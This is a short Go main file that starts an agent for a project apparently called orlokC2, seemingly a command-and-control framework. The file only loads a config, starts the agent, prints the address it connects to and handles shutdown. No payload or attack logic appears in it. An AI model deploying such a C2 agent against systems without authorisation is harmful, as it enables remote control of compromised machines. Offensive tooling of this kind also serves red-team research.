package main

import (
	"fmt"
	"github.com/faanross/orlokC2/internal/agent/agent"
	"github.com/faanross/orlokC2/internal/agent/config"
	"os"
	"os/signal"
	"syscall"
)

func main() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	agentConfig := config.NewConfig()

	c2Agent := agent.NewAgent(agentConfig)

	err := c2Agent.Start()
	if err != nil {
		fmt.Printf("Error starting agent: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("Agent started")
	fmt.Printf("Connected to : %s\n", c2Agent.GetTargetAddress())

	<-sigChan
	fmt.Println("Agent stopped")
	c2Agent.Stop()
}
